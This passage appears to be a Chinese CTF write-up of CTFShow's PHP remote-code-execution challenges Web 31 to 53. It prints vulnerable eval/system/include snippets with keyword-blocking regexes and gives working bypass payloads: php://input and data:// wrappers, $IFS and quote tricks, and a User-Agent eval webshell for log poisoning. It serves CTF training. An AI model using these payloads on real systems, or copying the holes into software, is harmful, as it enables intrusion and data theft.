<p>next():\u5c06\u6570\u7ec4\u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a\uff0c\u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u7701\u7565\u5012\u7f6e\u548c\u6539\u53d8\u6570\u7ec4\u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528[2]\u53d6\u51fa\u6570\u7ec4\u4e5f\u53ef\u4ee5</p> <p><code>?c=show_source(scandir(getcwd())[2]);</code></p> <p>getcwd() \u51fd\u6570\u8fd4\u56de\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002\u5b83\u53ef\u4ee5\u4ee3\u66ffpos(localeconv())</p> <p>\u76f8\u5173\u7684\u65b9\u6cd5\uff1a</p> <p>current()\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u5f53\u524d\u5143\u7d20\u7684\u503c\u3002</p> <p>end()\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002</p> <p>next()\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002</p> <p>prev()\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u4e0a\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002</p> <p>reset()\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002</p> <p>each()\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u952e\u540d\u548c\u952e\u503c\uff0c\u5e76\u5c06\u5185\u90e8\u6307\u9488\u5411\u524d\u79fb\u52a8\u3002</p> <p>\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\uff1a</p> <p><code>?c=$f=glob(\"f*\");show_source($f[0]);</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-32","title":"Web 32","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)) {\n        eval($c);\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u770b\u4e86\u770bWP\uff0c\u4e24\u79cd\u65b9\u6cd5\uff0c\u6587\u4ef6\u5305\u542b\u3001\u65e5\u5fd7\u6ce8\u5165\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#_1","title":"\u6587\u4ef6\u5305\u542b\uff1a","text":"PHP<pre><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php\n?c=include%0A$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php\n\n?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php\n</code></pre> <p>\u5176\u5b9e\u4e24\u8005\u7684\u5dee\u8ddd\u53ea\u5728\u4e8e\u4e00\u4e2a%0a\uff0c\u6539\u4e0d\u6539\u65e0\u6240\u8c13\uff0c\u4e0b\u9762\u89e3\u91ca\u5404\u6210\u5206\u4f5c\u7528</p> <ul> <li>\u9996\u5148\u662finclude+\u53c2\u65701\uff0c\u4f5c\u7528\u662f\u5305\u542b\u53c2\u65701\u7684\u6587\u4ef6\uff0c\u8fd0\u7528\u4e86\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u6700\u540e\u7684\u6587\u4ef6\u540d\u5b57\u53ef\u4ee5\u6539\u4e3a/etc/passwd\u548cnginx\u7684\u65e5\u5fd7\u6587\u4ef6\u6765\u5b9a\u4f4dflag\u4f4d\u7f6e</li> <li>\u7136\u540e\u662f%0a\u4f5c\u7528\uff0c\u8fd9\u662furl\u56de\u8f66\u7b26\uff0c\u56e0\u4e3a\u7a7a\u683c\u88ab\u8fc7\u6ee4\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5220\u53bb\u4e5f\u65e0\u6240\u8c13\uff0c\u4f3c\u4e4ephp\u4f1a\u81ea\u52a8\u7ed9\u5b57\u7b26\u4e32\u548c\u53d8\u91cf\u95f4\u6dfb\u52a0\u7a7a\u683c\uff08\u7ecf\u68c0\u9a8c\uff0c\u53ea\u5728eval\u4e2d\u6709\u6548\uff0cecho\u4e2d\u65e0\u6548\uff0c\u8fd8\u662f\u5f97\u8981\u7a7a\u683c\uff09</li> <li>\u540e\u9762\u7684?&gt;\u7684\u4f5c\u7528\u662f\u4f5c\u4e3a\u7ed5\u8fc7\u5206\u53f7\uff0c\u4f5c\u4e3a\u8bed\u53e5\u7684\u7ed3\u675f\u3002\u539f\u7406\u662f\uff1aphp\u9047\u5230\u5b9a\u754c\u7b26\u5173\u95ed\u6807\u7b7e\u4f1a\u81ea\u52a8\u5728\u672b\u5c3e\u52a0\u4e0a\u4e00\u4e2a\u5206\u53f7\u3002\u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662fphp\u6587\u4ef6\u4e2d\u6700\u540e\u4e00\u53e5\u5728?&gt;\u524d\u53ef\u4ee5\u4e0d\u5199\u5206\u53f7\u3002</li> <li>\u5728c\u4e2d\u5f15\u7528\u4e86\u53c2\u65701\uff0c\u7136\u540e&amp;\u540e\u5bf9\u53c2\u65701\u5b9a\u4e49\uff0c\u8fd0\u7528\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e</li> <li>php://filter/convert.base64-encode/resource=  \u662fhackbar\u4e2dLFI\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u4e00\u4e2a\u529f\u80fd\uff0c\u7528\u6765\u5305\u542b\u5e76\u4e14\u8fd4\u56de\uff0c\u5f97\u5230\u7ed3\u679c\u8fd8\u8981\u8fdb\u884cbase64\u89e3\u7801</li> <li>\u6709\u7684\u65f6\u5019\u53c2\u6570\u662f\u6570\u5b57\u4f1a\u88ab\u8fc7\u6ee4\uff0c\u8fd9\u65f6\u5019\u6362\u6210\u5b57\u6bcd\u5c31\u884c\u4e86\uff08Web 36\uff09</li> </ul> <p>PS:\u524d\u9762\u7684\u51e0\u9053\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u505a\uff0c\u4f46\u662f\u6ca1\u6709\u4ec0\u4e48\u5fc5\u8981</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#_2","title":"\u65e5\u5fd7\u5305\u542b(\u5931\u8d25)","text":"<p>\u4f46\u662f\u5047\u5982\u6211\u4eec\u5e76\u4e0d\u77e5\u9053flag\u5728\u54ea\u91cc\u5462\uff1f \u6211\u4eec\u901a\u8fc7\u54cd\u5e94\u5934\uff0c\u53d1\u73b0\u662fnginx\uff0c\u9ed8\u8ba4nginx\u65e5\u5fd7\u6587\u4ef6\u5728/var/log/nginx/access.log</p> <p>\u7ed3\u5408\u8fd9\u91cc\u7684include\uff0c\u6784\u9020\u5982\u4e0b\u8bed\u53e5\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5148/etc/passwd\uff0c\u786e\u8ba4\u7684\u786e\u53ef\u4ee5\u5305\u542b\u3002</p> <p><code>?c=include%0a$_GET[a]?&gt;&amp;a=../../../../var/log/nginx/access.log</code></p> <p>\u8bbf\u95ee\u8be5\u8def\u5f84\u65f6\uff0c\uff08\u8fd9\u4e00\u6b65\u4e00\u76f4\u4e0d\u6210\u529f\uff09\u5728User-Agent\u4e2d\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c<code>&lt;?php @eval($_POST[\u2018a\u2019]);?&gt;</code>\uff0c\u7136\u540e\u7528\u4e2d\u56fd\u8681\u5251\u8fde\u63a5\u5373\u53ef</p> <p>\u6216\u8005\u4fee\u6539User-Agent\u4e3a\u6211\u4eec\u8981\u6267\u884c\u7684\u8bed\u53e5\uff0c\u8bbf\u95ee\u4e3b\u9875\u3002 \u518d\u53bb\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u76ee\u5f55\u7684\u6587\u4ef6\u5217\u8868\u4e86\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-35","title":"Web 35","text":"PHP<pre><code>if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=/i\", $c)){ \n</code></pre> <p>\u8fd9\u91cc\u4ecb\u7ecd\u4e24\u79cd\u65b9\u6cd5\uff1a<code>php://input</code>\u548c<code>Data\u4f2a\u534f\u8bae</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#phpinput","title":"php://input","text":"<p>\u9898\u76ee\u5bf9\u5e38\u89c1\u547d\u4ee4\u90fd\u8fdb\u884c\u8fc7\u6ee4\uff0c\u4f46\u662f\u4ed4\u7ec6\u53d1\u73b0\u53ef\u4ee5\u5229\u7528include\u8fdb\u884c\u7ed5\u8fc7\uff0c\u5177\u4f53\u5b9e\u73b0\u65b9\u5f0f\u4e3a <code>eval(include flag.php;);</code>\uff0c\u4f46\u662f\u9898\u76ee\u5c4f\u853d\u4e86\u5206\u53f7(;)\u548c\u70b9\u53f7(.),\uff0c\u5176\u4e2d\u5206\u53f7\u53ef\u4ee5\u4f7f\u7528?&gt;\u5e73\u66ff\uff0c\u4f46\u662f\u70b9\u53f7\u65e0\u6cd5\u7ed5\u8fc7\uff0c\u9042\u4f7f\u7528post\u6267\u884cphp\u4ee3\u7801\u6ce8\u5165flag.php\uff0c\u56e0\u6b64\u53ef\u5f97payload:</p> <p>GET\uff1a<code>?c=include$_GET[1]?&gt;&amp;1=php://input</code></p> <p>POST\uff1a<code>&lt;?php system('tac flag.php');?&gt;</code></p> <p>\u6ce8\u610f\uff1a\u56e0\u4e3aPOST\u6ca1\u6709\u6309\u7167key=value\u5c01\u88c5\u6570\u636e\uff0c\u56e0\u6b64hackBar\u8ba4\u4e3a\u6570\u636e\u6709\u95ee\u9898\uff0c\u4e0d\u4f1a\u53d1\u9001\u6570\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528Burp Suite\u53d1\u9001\u6570\u636e\u3002!!\u6ce8\u610f!! php://input\u522b\u4f7f\u7528hackbar\uff0c\u7528BurpSuite</p> <p>\u8865\u5145: <code>php://input</code>\u9ed8\u8ba4\u8bfb\u53d6\u6ca1\u6709\u5904\u7406\u8fc7\u7684POST\u6570\u636e</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#data","title":"Data\u4f2a\u534f\u8bae\uff1a","text":"<p>Data\u4f2a\u534f\u8bae\u7528\u6cd5\uff1a</p> <ol> <li><code>data://text/plain,php\u4ee3\u7801</code></li> <li><code>data://text/plain;base64,php\u4ee3\u7801</code></li> </ol> <p><code>?c=include%0a$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(\"tac fla*\");?&gt;</code></p> <p>\u8fd9\u4e2a\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u4e5f\u662f\u5728hackbar\u91cc\u9762\u53d1\u9001\u4e0d\u51fa\u53bb\uff0c\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u91cc\u9762\u5f04\u5c31\u597d\u4e86</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-37","title":"Web 37","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\n//flag in flag.php\nerror_reporting(0);\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/flag/i\", $c)) {\n        include($c);\n        echo $flag;\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>include \uff08\u6216 require\uff09\u8bed\u53e5\u4f1a\u83b7\u53d6\u6307\u5b9a\u6587\u4ef6\u4e2d\u5b58\u5728\u7684\u6240\u6709\u6587\u672c/\u4ee3\u7801/\u6807\u8bb0\uff0c\u5e76\u590d\u5236\u5230\u4f7f\u7528 include \u8bed\u53e5\u7684\u6587\u4ef6\u4e2d\u3002 \u4f2a\u534f\u8bae\u4e2d\u7684<code>data://</code>\uff0c\u53ef\u4ee5\u8ba9\u7528\u6237\u6765\u63a7\u5236\u8f93\u5165\u6d41\uff0c\u5f53\u5b83\u4e0e\u5305\u542b\u51fd\u6570\u7ed3\u5408\u65f6\uff0c\u7528\u6237\u8f93\u5165\u7684data://\u6d41\u4f1a\u88ab\u5f53\u4f5cphp\u6587\u4ef6\u6267\u884c</p> PHP<pre><code>?c=data://text/plain,&lt;?php system(\"cat f*\")?&gt;       //\u67e5\u770bflag.php\uff0c\u53f3\u952e\u6e90\u7801\u4e2d\u67e5\u627eflag\n?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKT8+\n                          //'base64,'\u540e\u9762\u662fbase64\u52a0\u5bc6\u7684&lt;?php system('cat flag.php')?&gt;\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\n                          //'base64,'\u540e\u9762\u662fbase64\u52a0\u5bc6\u7684&lt;?php system(\"tac flag.php\")?&gt;\n                          // Base64\u5185\u5bb9\u4e2d\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5728php\u540e\u56de\u8f66\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-39","title":"Web 39","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/flag/i\", $c)) {\n        include($c . \".php\");\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u67e5\u770b\u53d1\u73b0\u53ea\u8fc7\u6ee4flag\uff0c\u4f46\u662fLFI\u7684\u65f6\u5019\u4f1a\u5e26\u4e0a.php\uff0c\u8fd9\u91cc\u5148\u5c1d\u8bd5\u4e00\u6ce2\u6267\u884cdata\u4f2a\u534f\u8bae\uff0c\u5c1d\u8bd5.php\u540e\u7f00\u662f\u5426\u4f1a\u5bf9\u4f2a\u534f\u8bae\u7684\u6267\u884c\u4ea7\u751f\u5f71\u54cd</p> <p><code>?c=data://text/plain,&lt;?php system(\"tac fla*.php\");?&gt;</code></p> <p>\u6267\u884c\u53d1\u73b0\u6210\u529f\uff0c\u52a0\u4e0a.php\u5e76\u4e0d\u4f1a\u5bf9\u4f2a\u534f\u8bae\u7684\u6267\u884c\u6709\u5f71\u54cd,\u56e0\u4e3a&lt;?php code ?&gt; \u5df2\u7ecf\u95ed\u5408\u6267\u884c\u5b8c\u4e86</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#_3","title":"\u53cc\u5f15\u53f7\u5f15\u53d1\u7684\u95ee\u9898\uff1a","text":"<p>\u8fd9\u53e5\u8bdd\u4e0d\u80fd\u6210\u529f\uff1a<code>?c=data://text/plain,&lt;?php system(\u201ctac fla*.php\u201d);?&gt;</code></p> <p>\u4f46\u662f\u4e0a\u9762\u90a3\u4e00\u53e5\u53ef\u4ee5\uff0c\u8fd9\u4e24\u4e2a\u53ea\u6709\u53cc\u5f15\u53f7\u4e0d\u540c\uff0c<code>\"\"</code> <code>\u201c\u201d</code> \uff0c\u90fd\u662f\u82f1\u6587\u72b6\u6001\u4e0b\u7684\u53cc\u5f15\u53f7\uff0c\u4f46\u5c31\u662f\u4e0d\u4e00\u6837\uff0c\u5176\u5b9e\u524d\u8005\u662f\u5728url\u4e2d\u8f93\u5165\u7684\u53cc\u5f15\u53f7\uff0c\u800c\u540e\u8005\u5c31\u662f\u5728\u8fd9\u91cc\u8f93\u5165\u7684\u3002\u4ee5\u540e\u9700\u8981\u6ce8\u610f\u4e00\u4e0b\u8fd9\u4e2a\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-40","title":"Web 40","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\\uff08|\\\uff09|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $c)) {\n        eval($c);\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u6ce8\u610f\u770b\uff1a\u88ab\u8fc7\u6ee4\u7684\u662f\u4e2d\u6587\u72b6\u6001\u4e0b\u7684\u62ec\u53f7\uff0c\u800c\u975e\u82f1\u6587</p> <p>\u9898\u76ee\u8003\u5bdfphp\u65e0\u53c2\u6570\u51fd\u6570\u6784\u9020\uff0c\u5373\u53ef\u4ee5\u4e3a<code>a(b());a();</code>\u7b49\u4f46\u4e0d\u80fd\u4e3a<code>a('b');</code>\u7b49</p> <p>\uff08Web 29\uff09\uff08Web 31\uff09\uff1a</p> <p><code>?c=print_r(scandir(current(localeconv())));</code></p> <p><code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p> <p>\u6216\u8005\uff1a\uff08\u4e0d\u61c2\u7684\u8bdd \u5c31\u770b\u770b\u4e0b\u8fb9\u7684\u53c2\u8003\u6587\u7ae0\uff09</p> <p><code>?c=eval(array_pop(next(get_defined_vars())));</code></p> <p>\u9700\u8981POST\u4f20\u5165\u53c2\u6570\u4e3a1=system('tac fl*');</p> <p>get_defined_vars() \u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u6240\u6709\u5df2\u5b9a\u4e49\u53d8\u91cf\u7684\u591a\u7ef4\u6570\u7ec4\u3002\u8fd9\u4e9b\u53d8\u91cf\u5305\u62ec\u73af\u5883\u53d8\u91cf\u3001\u670d\u52a1\u5668\u53d8\u91cf\u548c\u7528\u6237\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u4f8b\u5982GET\u3001POST\u3001FILE\u7b49\u7b49\u3002</p> <p>next()\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002</p> <p>array_pop() \u51fd\u6570\u5220\u9664\u6570\u7ec4\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\u5176\u503c\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#php","title":"\u9898\u76ee\u7684\u91cd\u70b9\uff1aphp\u65e0\u53c2\u6570\u51fd\u6570\u5229\u7528","text":"<p>\u53c2\u8003\uff1aPHP\u65e0\u53c2\u6570\u51fd\u6570\u5229\u7528</p> <p>\u65e0\u53c2\u6570\u7684\u610f\u601d\u53ef\u4ee5\u662fa()\u3001a(b())\u6216a(b(c()))\uff0c\u4f46\u4e0d\u80fd\u662fa(\u2018b\u2019)\u6216a(\u2018b\u2019,\u2018c\u2019)\uff0c\u4e0d\u80fd\u5e26\u53c2\u6570</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-42","title":"Web 42","text":"PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    system($c . \" &gt;/dev/null 2&gt;&amp;1\");\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre> <p>\u8fd9\u884c\u4ee3\u7801\u6267\u884c\u4e00\u4e2a\u7cfb\u7edf\u547d\u4ee4\uff0c\u8be5\u547d\u4ee4\u7531\u53d8\u91cf $c \u7684\u503c\u6307\u5b9a\u3002<code>&gt;/dev/null 2&gt;&amp;1</code> \u662f\u4e00\u4e2a shell  \u91cd\u5b9a\u5411\u64cd\u4f5c\uff0c\u610f\u5473\u7740\u547d\u4ee4\u7684\u6807\u51c6\u8f93\u51fa\uff08stdout\uff09\u548c\u6807\u51c6\u9519\u8bef\uff08stderr\uff09\u90fd\u88ab\u91cd\u5b9a\u5411\u5230  /dev/null\uff0c\u5373\u88ab\u4e22\u5f03\uff0c\u7528\u6237\u4e0d\u4f1a\u770b\u5230\u4efb\u4f55\u8f93\u51fa\u7ed3\u679c\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#_4","title":"\u65b9\u6cd5\u4e00\uff1a","text":"<p>\u76f4\u63a5<code>/?c=cat flag.php</code>\u6216\u8005<code>cat flag.php%0a</code> \u4e4b\u540e\u67e5\u770b\u6e90\u4ee3\u7801</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#_5","title":"\u65b9\u6cd5\u4e8c\uff1a","text":"<p>\u4f7f\u7528 <code>\";\"\u3001\"||\"\u3001\"&amp;\"\u3001\"&amp;&amp;\"</code>\u5206\u9694</p> <p>; //\u5206\u53f7  | //\u53ea\u6267\u884c\u540e\u9762\u90a3\u6761\u547d\u4ee4  || //\u53ea\u6267\u884c\u524d\u9762\u90a3\u6761\u547d\u4ee4  &amp; //\u4e24\u6761\u547d\u4ee4\u90fd\u4f1a\u6267\u884c  &amp;&amp; //\u4e24\u6761\u547d\u4ee4\u90fd\u4f1a\u6267\u884c</p> <p>\u53ef\u6784\u9020playload: <code>?c=tac flag.php||</code> <code>?c=tac flag.php%26</code>  \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684&amp;\u9700\u8981url\u7f16\u7801</p> <p><code>/dev/null 2&gt;&amp;1</code>\u662f\u4e0d\u8fdb\u884c\u56de\u663e\uff0c\u6240\u4ee5\u91c7\u7528\u547d\u4ee4\u628aflag\u6253\u5370\u51fa\u6765\uff0c\u5229\u7528<code>;</code>\u5206\u9694\u5206\u5316\u4e00\u4e0b \u6784\u9020payload\uff1a</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-43","title":"Web 43","text":"<p>\u547d\u4ee4\u6267\u884c\uff0c\u56e0\u4e3a\u6b63\u5219\u8fc7\u6ee4\u4e86\uff1b\u5206\u53f7\uff0c\u8fc7\u6ee4\u4e86cat\uff0c\u6240\u4ee5\u4f7f\u7528\u4e86<code>?c=tac flag*%0a</code></p> <p>\u4e5f\u53ef\u4ee5\uff1a</p> Text Only<pre><code>?c=ls||\n?c=tac flag.php||\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-44","title":"Web 44","text":"<p><code>?c=tac fl*||</code></p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7cp\u547d\u4ee4\u5c06flag.php\u7684\u5185\u5bb9cp\u6210txt\u683c\u5f0f\u7684\uff0c<code>?c=cp fl* a.txt</code>\uff0c\u4e4b\u540e\u76f4\u63a5\u8bbf\u95eea.txt\u5c31\u53ef\u4ee5\u76f4\u63a5\u770b\u5230flag\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-45","title":"Web 45","text":"<p>\u8fc7\u6ee4\u4e86\u7a7a\u683c</p> Text Only<pre><code>?c=echo$IFS`tac$IFS*`%0A\n</code></pre> <p>\u6216\u8005\u76f4\u63a5<code>%09</code>\uff1a<code>?c=tac%09fl*||</code>\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-46","title":"Web 46","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)) {\n        system($c . \" &gt;/dev/null 2&gt;&amp;1\");\n    }\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre> <p>\u5b98\u65b9\uff1a<code>?c=nl&lt;fla''g.php||</code></p> <p>\u6216\u8005\uff1a<code>?c=tac%09fla?.php||</code></p> <p>\u6216\u8005\uff1a<code>?c=ca\\t&lt;fl\\ag.php||</code></p> <p>\u6216\u8005\uff1a<code>?c=tac&lt;fla%27%27g.php||</code></p> <p>\u51e0\u79cd\u7ed5\u8fc7\u7a7a\u683c\u7684\u65b9\u5f0f <code>{cat,flag.txt}</code>\u3001<code>cat${IFS}flag.txt</code>\u3001<code>cat$IFS$9flag.txt</code>\u3001<code>cat&lt;flag.txt</code>//\u8fd9\u4fe9&lt;&gt;\u8c8c\u4f3c\u6ca1\u5565\u7528 <code>cat&lt;&gt;flag.txt</code></p> <p>\u6700\u540e\u662f<code>cat%0afla?.php</code>\u3001<code>cat%09fla?.php</code>\uff0c\u8fd9\u4fe9\u7684\u533a\u522b\u662f\u524d\u8005\uff08%0a\u7ecf\u8fc7URL\u89e3\u7801\u662f\u6362\u884c\u7684\u610f\u601d\uff09\u53ef\u4ee5\u7528\u6765\u505a\u672b\u5c3e\u7684\u622a\u65ad\uff0c\u540e\u8005\uff08%09\u662ftab\u7684\u610f\u601d\uff09\u7528\u4e8e\u8bed\u53e5\u4e2d\u95f4\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-47","title":"Web 47","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\", $c)) {\n        system($c . \" &gt;/dev/null 2&gt;&amp;1\");\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u5b98\u65b9\uff1a<code>?c=nl&lt;fla''g.php||</code></p> <p>\u6216\u8005\uff1a<code>?c=tac%09fla?.php||</code></p> <p>\u6216\u8005\uff1a<code>?c=tac&lt;f''lag.php||</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-48","title":"Web 48","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\", $c)) {\n        system($c . \" &gt;/dev/null 2&gt;&amp;1\");\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u5b98\u65b9\uff1a<code>?c=nl&lt;fla''g.php||</code>\uff08\u6ce8\u610f\u4e00\u5b9a\u8981\u4e24\u4e2a\u5355\u5f15\u53f7\u53bb\u95ed\u5408\uff09</p> <p>\u6216\u8005\uff1a<code>?c=tac&lt;fla%27%27g.php||</code></p> <p><code>?c=tac%09fla\\g.php%0a</code> \u5176\u4e2d%0a\u7ecf\u8fc7URL\u89e3\u7801\u662f\u6362\u884c\u7684\u610f\u601d\uff0c%09\u662ftab\u7684\u610f\u601d</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-49","title":"Web 49","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\", $c)) {\n        system($c . \" &gt;/dev/null 2&gt;&amp;1\");\n    }\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre> <p>\u5b98\u65b9\uff1a<code>?c=nl&lt;fla''g.php||</code></p> <p>\u6216\u8005\uff1a<code>?c=tac%09fla?????%26</code>\uff08<code>%26</code>\u662f<code>&amp;</code>\uff09</p> <p>\u6216\u8005\uff1a<code>?c=tac%09fla?.php||</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-52","title":"Web 52","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\", $c)) {\n        system($c . \" &gt;/dev/null 2&gt;&amp;1\");\n    }\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre> <p>\u7a7a\u683c\u7684\u53e6\u4e00\u79cd\u7ed5\u8fc7\u65b9\u6cd5</p> <p>\u5b98\u65b9\uff1a<code>?c=nl$IFS/fla''g||</code></p> <p>\u6216\u8005\uff1a<code>?c=nl${IFS}/fla''g%0a</code></p> <p>\u6216\u8005\uff1a<code>?c=ca\\t$IFS/fla''g||</code></p> <p>\u6216\u8005\uff1a<code>?c=ca\\t${IFS}/fla?||</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-53","title":"Web 53","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i\", $c)) {\n        echo ($c);\n        $d = system($c);\n        echo \"&lt;br&gt;\" . $d;\n    } else {\n        echo 'no';\n    }\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre> <p>\u5b98\u65b9\uff1a<code>?c=c''at${IFS}fla''g.p''hp</code></p> <p>\u6216\u8005\uff1a<code>?c=s''ort${IFS}f???????%0a</code></p> <p>\u6216\u8005\uff1a<code>?c=ca''t${IFS}fla''g.php</code></p> <p>\u6216\u8005\uff1a<code>?c=ta\\c${IFS}fla\\g.php</code></p> 